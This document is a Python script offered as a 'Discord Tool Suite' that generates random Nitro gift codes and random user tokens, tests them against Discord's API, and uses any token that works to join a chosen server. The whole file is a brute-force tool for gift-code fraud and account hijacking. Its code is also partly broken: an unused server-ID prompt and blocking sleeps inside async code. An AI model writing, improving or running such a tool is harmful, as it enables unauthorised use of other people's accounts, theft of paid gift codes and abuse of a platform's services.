import aiohttp
import asyncio
import os
import random
import string
from rich.console import Console
from rich.prompt import Prompt
from rich.text import Text
from rich.panel import Panel
from rich.progress import track
from time import sleep

console = Console()

# Function to generate a random user token
def generate_token(length=59):
    return ''.join(random.choices(string.ascii_letters + string.digits + '._', k=length))

# Function to generate a random Nitro code
def generate_nitro_code(length=16):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

# Function to check if the token is valid and try to join a server
async def check_token_and_join(session, token, server_id):
    url = f"https://discord.com/api/v9/guilds/{server_id}/members/@me"
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0'
    }

    try:
        async with session.get(url, headers=headers) as response:
            if response.status == 200:
                join_url = f"https://discord.com/api/v9/guilds/{server_id}/members/@me"
                async with session.put(join_url, headers=headers) as join_response:
                    if join_response.status == 201:
                        return f"Success: {token[:8]}... joined server {server_id}", "green"
                    else:
                        return f"Failed to join server: {token[:8]}...", "red"
            elif response.status == 401:
                return f"Invalid Token: {token[:8]}...", "red"
            else:
                return f"Unknown Status ({response.status}): {token[:8]}...", "yellow"
    except Exception as e:
        return f"Error: {e}", "red"

# Function to check if the Nitro code is valid
async def check_nitro_code(session, code):
    url = f"https://discord.com/api/v9/entitlements/gift-codes/{code}"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0'
    }

    try:
        async with session.get(url, headers=headers) as response:
            if response.status == 200:
                return f"Valid Nitro Code: https://discord.com/gifts/{code}", "green"
            else:
                return f"Invalid Nitro Code: https://discord.com/gifts/{code}", "red"
    except Exception as e:
        return f"Error: {e}", "red"

# Main function to handle user input and menu
async def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    console.print(Panel("[bold cyan]Discord Tool Suite[/bold cyan]", title="Welcome", border_style="cyan"))

    menu_choice = Prompt.ask("[bold]Choose an option:[/bold]\n1. Generate and Check Nitro Codes\n2. Generate and Check User Tokens\n3. Exit", choices=["1", "2", "3"])
    
    if menu_choice == "1":
        server_id = Prompt.ask("Enter the server ID you want to join", default="your_server_id")
        num_nitros = Prompt.ask("How many Nitro codes do you want to generate and check?", default="10")
        try:
            num_nitros = int(num_nitros)
        except ValueError:
            console.print("[red]Invalid number of Nitro codes. Exiting...[/red]")
            return
        
        console.print("[bold yellow]Please wait, generating and checking Nitro codes...[/bold yellow]")

        async with aiohttp.ClientSession() as session:
            tasks = []
            for _ in track(range(num_nitros), description="Generating Nitro codes"):
                code = generate_nitro_code()
                tasks.append(check_nitro_code(session, code))
                sleep(0.1)  # Adjust this to slow down the generation and checking process
            
            results = await asyncio.gather(*tasks)
        
        for result, color in results:
            console.print(Text(result, style=color))
        
        console.print("[bold green]Finished processing all Nitro codes![/bold green]")
    
    elif menu_choice == "2":
        server_id = Prompt.ask("Enter the server ID you want to join", default="your_server_id")
        num_tokens = Prompt.ask("How many tokens do you want to generate and check?", default="10")
        try:
            num_tokens = int(num_tokens)
        except ValueError:
            console.print("[red]Invalid number of tokens. Exiting...[/red]")
            return
        
        console.print("[bold yellow]Please wait, generating and checking tokens...[/bold yellow]")

        async with aiohttp.ClientSession() as session:
            tasks = []
            for _ in track(range(num_tokens), description="Generating tokens"):
                token = generate_token()
                tasks.append(check_token_and_join(session, token, server_id))
                sleep(0.5)  # Adjust this to slow down the generation and checking process
            
            results = await asyncio.gather(*tasks)
        
        for result, color in results:
            console.print(Text(result, style=color))
        
        console.print("[bold green]Finished processing all tokens![/bold green]")

    elif menu_choice == "3":
        console.print("[bold cyan]Exiting...[/bold cyan]")

if __name__ == '__main__':
    asyncio.run(main())
